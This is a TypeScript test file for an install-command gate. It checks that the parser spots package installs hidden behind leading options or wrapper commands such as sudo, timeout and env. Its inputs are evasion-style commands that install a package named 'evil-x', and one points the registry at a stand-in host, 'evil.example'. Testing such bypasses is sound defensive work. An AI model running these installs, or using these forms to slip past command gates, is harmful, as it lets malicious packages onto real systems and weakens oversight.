import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { parseInstallCommand } from "./install-gate.js";

/**
 * Options before the subcommand, and a wrapper's own values. Every form below passed the gate
 * with no output before (kit-research `adversarial-battery-tier3-gate-attacks`, rows G01/G05):
 * the option's separate value read as the subcommand, or the wrapper's value as argv0.
 */
const refsOf = (cmd: string) => parseInstallCommand(cmd).refs;

describe("install gate — a package manager's options before the subcommand (G01)", () => {
  const forms: [string, string][] = [
    ["npm --prefix /tmp/x install evil-x", "npm:evil-x"],
    ["npm -C /tmp/x install evil-x", "npm:evil-x"],
    ["npm --loglevel silent install evil-x", "npm:evil-x"],
    ["npm --workspace pkgs/a install evil-x", "npm:evil-x"],
    ["pnpm -C /tmp/x add evil-x", "npm:evil-x"],
    ["pnpm --dir /tmp/x add evil-x", "npm:evil-x"],
    ["pnpm --filter web add evil-x", "npm:evil-x"],
    ["yarn --cwd /tmp/x add evil-x", "npm:evil-x"],
    ["bun --cwd /tmp/x add evil-x", "npm:evil-x"],
    ["uv --directory /tmp/x add evil-x", "pip:evil-x"],
    ["uv --project /tmp/x pip install evil-x", "pip:evil-x"],
  ];
  for (const [cmd, ref] of forms) {
    it(`triages ${cmd}`, () => assert.deepEqual(refsOf(cmd), [ref]));
  }

  it("still triages the forms that already worked", () => {
    assert.deepEqual(refsOf("npm --prefix=/tmp/x install evil-x"), ["npm:evil-x"]);
    assert.deepEqual(refsOf("npm install --prefix /tmp/x evil-x"), ["npm:evil-x"]);
    assert.deepEqual(refsOf("npm -g install evil-x"), ["npm:evil-x"]);
  });

  it("blocks fail-closed when an unknown option may have swallowed the subcommand slot", () => {
    const p = parseInstallCommand("npm --frobnicate thing install evil-x");
    assert.equal(p.isInstall, true);
    assert.deepEqual(p.unverifiable, ["global-option:npm --frobnicate thing"]);
  });

  it("does not block an unknown option when no fetch verb follows, or the verb is in its slot", () => {
    assert.equal(parseInstallCommand("npm --frobnicate thing run build").isInstall, false);
    assert.equal(parseInstallCommand("pnpm --silent run build").isInstall, false);
    assert.deepEqual(refsOf("npm --frobnicate install evil-x"), ["npm:evil-x"]);
  });

  it("keeps a bare reinstall in another directory benign", () => {
    assert.equal(parseInstallCommand("npm --prefix app install").isInstall, false);
    assert.equal(parseInstallCommand("pnpm -C app install").isInstall, false);
    assert.equal(parseInstallCommand("npm --prefix app run build").isInstall, false);
  });

  it("still sees a registry redirect next to folded options", () => {
    const p = parseInstallCommand(
      "npm --registry https://evil.example --prefix /x -C /y install evil-x",
    );
    assert.ok(
      p.unverifiable.some((u) => u.startsWith("alt-registry:")),
      p.unverifiable.join(),
    );
  });
});

describe("install gate — a wrapper's own values (G05)", () => {
  const forms = [
    "nice -n 5 npm i evil-x",
    "sudo -u root npm i evil-x",
    "sudo -u root -g wheel npm i evil-x",
    "timeout 600 npm i evil-x",
    "timeout -s KILL 60 npm i evil-x",
    "ionice -c 3 npm i evil-x",
    "chrt 10 npm i evil-x",
    "taskset 0x1 npm i evil-x",
    "flock /tmp/lock npm i evil-x",
    "env -i PATH=/usr/bin npm i evil-x",
  ];
  for (const cmd of forms) {
    it(`triages ${cmd}`, () => assert.deepEqual(refsOf(cmd), ["npm:evil-x"]));
  }

  it("reads env -i and sudo -i as the wrapper's flags, not a registry option", () => {
    assert.deepEqual(parseInstallCommand("env -i PATH=/usr/bin npm i evil-x").unverifiable, []);
    assert.deepEqual(parseInstallCommand("sudo -i npm i evil-x").unverifiable, []);
  });

  it("does not invent an install after a wrapper running something else", () => {
    assert.equal(parseInstallCommand("timeout 60 make test").isInstall, false);
    assert.equal(parseInstallCommand("sudo vim npm-notes.txt").isInstall, false);
    assert.equal(parseInstallCommand("nice -n 5 node build.js").isInstall, false);
  });
});
